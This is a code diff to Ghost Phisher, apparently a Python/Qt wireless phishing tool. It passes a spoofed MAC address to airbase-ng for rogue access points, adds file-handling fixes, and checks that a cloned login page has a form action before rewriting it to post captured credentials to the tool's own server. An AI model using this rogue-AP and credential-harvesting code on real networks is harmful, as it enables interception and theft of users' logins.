@@ -1470,7 +1470,7 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
                     self.acess_interface.setText('Current Interface:&nbsp;<font color=green> %s</font>'%(card_detail.split()[0]))
                     self.driver_label.setText('Driver:&nbsp;<font color=green> %s</font>'%(card_detail.split()[2]))
                     mac_process = open('/sys/class/net/%s/address'%(selected_card))
-                    mac_address = mac_process.read()
+                    mac_address = mac_process.read().strip('\n')
                     self.mac_address_label.setText('Mac Address:&nbsp;<font color=green> %s</font>'%(mac_address))
                     self.monitor_label.setText('Monitor:&nbsp;<font color=red>Not Started</font>')
                     self.monitor_button.setEnabled(True)
@@ -1664,10 +1664,12 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
     def rouge_launch(self):
         global essid
         global channel
+        global mac_address
         global ip_address_text
         global access_point_control
         global monitor
         global access_point_error
+
 
 	essid = str(self.access_name_edit.text())
         channel = str(self.channel_combo.currentText())
@@ -1677,11 +1679,11 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         thread.start_new_thread(self.rougue_launch_phase,())
 
         if self.rouge_radio.isChecked() == True:
-            output = commands.getstatusoutput("airbase-ng -e '%s' -c %s %s > /tmp/access_point_log"%(essid,channel,monitor))
+            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s %s > /tmp/access_point_log"%(mac_address,essid,channel,monitor))
         elif self.wep_radio.isChecked() == True:
-            output = commands.getstatusoutput("airbase-ng -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(essid,channel,key,monitor))
+            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
         else:
-            output = commands.getstatusoutput("airbase-ng -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(essid,channel,key,monitor))
+            output = commands.getstatusoutput("airbase-ng -a %s -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
 
 
 
@@ -1973,7 +1975,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             create_settings('self.alternatedns_ip',alternatedns_ip)
 
             if 'dhcpd.conf_original' in os.listdir('/etc/dhcp3/'):      # Remove dhcpd.conf file if ghost_phiser had earlierly created it to avoid using old settings
-                os.remove('/etc/dhcp3/dhcpd.conf')
+                if 'dhcpd.conf' in os.listdir('/etc/dhcp3'):
+                    os.remove('/etc/dhcp3/dhcpd.conf')
             else:
                 os.rename('/etc/dhcp3/dhcpd.conf','/etc/dhcp3/dhcpd.conf_original')     # Backup your original dhcp settings if they exist
 
@@ -2045,7 +2048,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
     def stop_http(self):
         ''' Stop the DHCP Server'''
-        global server
         global http_control
         global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
         http_control = 1
@@ -2161,6 +2163,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         '''
         global http_address
         global http_server_port
+
+        self.status_textbrowser_http.clear()
 
         if 'website_url.log' in os.listdir(os.sep + 'tmp' + os.sep):
             os.remove(os.sep + 'tmp' + os.sep + 'website_url.log')
@@ -2377,28 +2381,35 @@ print("""
 
 
             new_post_action = html_source.replace(action_string,"action=" + http_address + "cgi-bin/login") # Replaces action variable with ours e.g <action="http://192.168.0.23/cgi-bin/login">
-            os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
-            new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
-            new_html_file.write(new_post_action)
-            new_html_file.close()
+            #
+            # Check if html source has a valid Post action method
+            #
+            if 'action' in html_source:
+                os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
+                new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
+                new_html_file.write(new_post_action)
+                new_html_file.close()
 
-            thread.start_new_thread(self.HTTP_Server,(http_server_port,0))      # Starts the HTTP Server
+                thread.start_new_thread(self.HTTP_Server,(http_server_port,0))      # Starts the HTTP Server
 
-            self.http_start.setEnabled(False)
-            self.http_stop.setEnabled(True)
-            self.http_captured_credential.setText('captured credentials:')
-            self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
-            self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
-            self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))
+                self.http_start.setEnabled(False)
+                self.http_stop.setEnabled(True)
+                self.http_captured_credential.setText('captured credentials:')
+                self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
+                self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
+                self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))
 
-            if http_server_port == 80:
-                http_address = 'http://%s/'%(actions_ip_address)
-                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
+                if http_server_port == 80:
+                    http_address = 'http://%s/'%(actions_ip_address)
+                    self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
+                else:
+                    http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
+                    self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
+
+                thread.start_new_thread(self.auto_check_thread,())                  # Runs the thread loop that checks for new inputs to database
+
             else:
-                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
-                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
-
-            thread.start_new_thread(self.auto_check_thread,())                  # Runs the thread loop that checks for new inputs to database
+                self.status_textbrowser_http.append('<font color=red>Source page does not have any html post action method, if you are trying to host a normal page please use the Normal HTTP server tab<font>')
 
 
 
